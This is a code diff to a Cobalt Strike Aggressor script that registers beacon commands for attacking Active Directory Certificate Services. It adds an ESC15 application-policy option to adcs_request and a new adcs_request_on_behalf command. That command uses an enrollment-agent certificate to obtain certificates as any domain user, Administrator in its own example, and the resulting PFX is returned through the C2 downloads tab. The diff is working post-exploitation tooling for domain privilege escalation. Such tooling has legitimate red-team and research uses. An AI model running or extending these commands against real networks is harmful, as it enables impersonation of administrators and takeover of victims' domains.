@@ -1640,7 +1640,7 @@ beacon_command_register(
 );
 
 alias adcs_request {
-	local('$params $keys $args $adcs_request_ca $adcs_request_template $adcs_request_subject $adcs_request_altname $adcs_request_install $adcs_request_machine');
+	local('$params $keys $args $adcs_request_ca $adcs_request_template $adcs_request_subject $adcs_request_altname $adcs_request_install $adcs_request_machine $app_policy');
 
     if(size(@_) < 2)
     {
@@ -1656,6 +1656,7 @@ alias adcs_request {
 	$adcs_request_altname = "";
 	$adcs_request_install = 0;
 	$adcs_request_machine = 0;
+    $app_policy = 0;
 	
     $adcs_request_ca = $2;
 	$adcs_request_template = iff(-istrue $3, $3, "");
@@ -1663,8 +1664,9 @@ alias adcs_request {
     $adcs_request_altname = iff(-istrue $5, $5, "");
     $adcs_request_install = iff(-istrue $6, $6, 0);
     $adcs_request_machine = iff(-istrue $7, $7, 0);
+    $app_policy = iff(-istrue $8, $8, 0);
 
-	$args = bof_pack($1, "ZZZZss", $adcs_request_ca, $adcs_request_template, $adcs_request_subject, $adcs_request_altname, $adcs_request_install, $adcs_request_machine);
+	$args = bof_pack($1, "ZZZZsss", $adcs_request_ca, $adcs_request_template, $adcs_request_subject, $adcs_request_altname, $adcs_request_install, $adcs_request_machine, $app_policy);
 	beacon_inline_execute($1, readbof($1, "adcs_request"), "go", $args);
 }
 
@@ -1683,20 +1685,66 @@ Usage:   adcs_request CA [opt:TEMPLATE] [opt:SUBJECT] [opt: ALTNAME] [opt: INSTA
          ALTNAME   Optional. The alternate subject's distinguished name. Use \"\" for default
          INSTALL   Optional. Install the certificate in current context? 0 = No, 1 = Yes. Default = 0
          MACHINE   Optional. Request a certificate for a machine instead of a user? 0 = No, 1 = Yes. Default = 0
+         ADD_APP_POLICY Optional. Adds App policy to allow client auth and Acting as a certificate agent. (ESC15)
 
          All arguments are positional. To a specify a non-default value for a optional you must specify a value for 
          All arguments prior to that given optional.
 
 Examples:
 basic:
-    adcs_request cert.example.org\example-CERT-CA 
+    adcs_request cert.example.org\\example-CERT-CA 
 
 all options:
-    adcs_request cert.example.org\example-CERT-CA vulnTemplate CN=Administrator,CN=Users,DC=example,DC=org CN=second_adm,CN=Users,DC=example,DC=org 0 0
+    adcs_request cert.example.org\\example-CERT-CA vulnTemplate CN=Administrator,CN=Users,DC=example,DC=org CN=second_adm,CN=Users,DC=example,DC=org 0 0
 
 use quotes for any arguments with spaces.
 "
 );
+
+alias adcs_request_on_behalf
+{
+    local('$handle $enrollpfx');
+    if(size(@_) < 5)
+    {
+        berror($1, beacon_command_detail("adcs_request_on_behalf"));
+		return;
+    }
+    $handle = openf($4);
+    $enrollpfx = readb($handle, -1);
+    closef($handle);
+    if(strlen($enrollpfx) == 0)
+    {
+        berror($1, "unable to open file at path $enrollpfx ");
+        return;
+    }
+    
+    
+    $args = bof_pack($1, "ZZzb", $2, $3, $5, $enrollpfx);
+    beacon_inline_execute($1, readbof($1, "adcs_request_on_behalf"), "go", $args);
+}
+
+
+beacon_command_register(
+    "adcs_request_on_behalf",
+    "Requests an enrollment certificate on behalf of another user",
+    "
+Command: adcs_request_on_behalf
+Summary: This command allows you to take a certificate that has XCN_OID_ENROLLMENT_AGENT as an MSApplicationPolicies extension
+and allows you to then request a certificate as if you were any other user in the domain.
+
+Usage:  adcs_request_on_behalf [TEMPLATE] [REQUESTER] [ENROLLMENT_AGENT.pfx] [Download_Name]
+        TEMPLATE  Required. The Template that you wish to request on behalf of a target user
+        REQUESTER Required. The domain / username who you want to make the request on behalf of
+        ENROLLMENT_AGENT.pfx Required. Local file path to where the .pfx is with OID_ENROLLMENT_AGENT extension
+        Download_Name Required.  Name you want this file to have when downloaded by the C2 framework.
+
+On success the newly requested PFX will be available in the cobalt strike downloads tab
+in other frameworks it is dependent on proper handling of cobalt strike style download messages.
+        
+Example:
+
+    adcs_request_on_behalf User Example\\Administrator /tmp/enroll.pfx Admin.pfx"
+)
 
 alias office_tokens 
 {
